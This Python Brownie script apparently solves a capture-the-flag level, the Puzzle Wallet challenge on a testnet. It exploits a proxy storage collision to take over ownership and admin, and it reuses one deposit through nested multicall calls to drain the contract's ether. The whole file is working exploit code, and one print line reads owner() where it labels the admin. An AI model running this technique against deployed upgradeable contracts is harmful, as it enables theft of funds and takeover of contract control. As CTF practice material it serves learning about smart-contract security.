#!/usr/bin/python3
from brownie import interface, web3
from brownie.convert import to_uint
from colorama import Fore
from scripts.helpful_scripts import get_account

# sepolia: 0x783AD551E9f387d6B470eE0584CD9dE1963a4e12
# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def attack(contract_address=None, attacker=None):
    wallet = interface.IWallet(contract_address)
    attacker = get_account()
    # print(proxy.address, attacker.address)

    # * update the pendingAdmin state var bcz. the proxy & contract var order mismathed
    wallet.proposeNewAdmin(attacker, {"from": attacker})

    wallet.addToWhitelist(attacker.address, {"from": attacker})
    # print(wallet.balances(attacker.address))

    # contract has 0.001 ETH
    """
    EXPLOIT:
    multicall
        deposit
            multicall again
                deposti again
    """
    deposit_data = []
    data = []

    deposit_data.append(wallet.deposit.encode_input())

    data.append(deposit_data[-1])
    data.append(wallet.multicall.encode_input(deposit_data))

    wallet.multicall(data, {"from": attacker, "value": "0.001 ether"})

    # print(wallet.balances(attacker.address))

    # * withdraw
    wallet.execute(attacker, "0.002 ether", "", {"from": attacker})

    # * become admin as the 2nd var in the proxy is admin & in wallet it's maxBalance
    wallet.setMaxBalance(to_uint(attacker.address), {"from": attacker})

    assert wallet.admin() == attacker.address

    print(f"{green}Wallet Owner: {red}{wallet.owner()}")
    print(f"{green}Wallet Admin: {red}{wallet.owner()}")
    print(f"{green}Wallet balance: {red}{wallet.balances(wallet.address)}{reset}")


def main(contract_address=None, attacker=None):
    if contract_address:
        attack(contract_address, get_account())
    else:
        attack()


if __name__ == "__main__":
    main()
